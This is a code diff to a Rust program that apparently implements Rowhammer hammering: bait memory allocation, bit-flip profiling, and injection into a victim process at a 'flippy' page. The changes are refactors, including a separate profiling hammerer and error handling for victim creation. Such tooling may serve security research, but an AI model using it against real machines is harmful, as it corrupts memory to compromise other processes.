@@ -378,14 +378,14 @@ unsafe fn _main() -> anyhow::Result<()> {
         bit_flips: Vec<Vec<BitFlip>>,
     }
     let mut stats = vec![];
-    for _ in 0..repetitions {
+    'repeat: for _ in 0..repetitions {
         info!("Starting bait allocation");
         let start = std::time::Instant::now();
         let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
         let alloc_duration = std::time::Instant::now() - start;
         info!("Allocated {} bytes of memory", memory.len());
 
-        let mut hammer = make_hammer(
+        let hammer = make_hammer(
             &args.hammerer,
             &pattern.pattern,
             &pattern.mapping,
@@ -402,8 +402,18 @@ unsafe fn _main() -> anyhow::Result<()> {
                 .mapping
                 .get_bitflips_relocate(mem_config, block_size.ilog2() as usize, &memory)
         );
+        let profile_hammer = make_hammer(
+            &args.hammerer,
+            &pattern.pattern,
+            &pattern.mapping,
+            mem_config,
+            block_size,
+            &memory,
+            1,
+            args.attempts,
+        )?;
         let profiling = hammer_profile(
-            &mut hammer,
+            &profile_hammer,
             &memory,
             args.profiling_rounds,
             Some(progress.clone()),
@@ -484,7 +494,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             None
         } else {
             //Some(victim::Process::new(&args.target)?)
-            Some(victim::StackProcess::new(
+            match victim::StackProcess::new(
                 &args.target,
                 InjectionConfig {
                     flippy_page: addr as *mut libc::c_void,
@@ -492,7 +502,13 @@ unsafe fn _main() -> anyhow::Result<()> {
                     bait_count_after: 7,
                     bait_count_before: 0,
                 },
-            )?)
+            ) {
+                Ok(p) => Some(p),
+                Err(e) => {
+                    warn!("Failed to create victim: {:?}", e);
+                    continue 'repeat;
+                }
+            }
         };
         match victim {
             Some(mut victim) => {
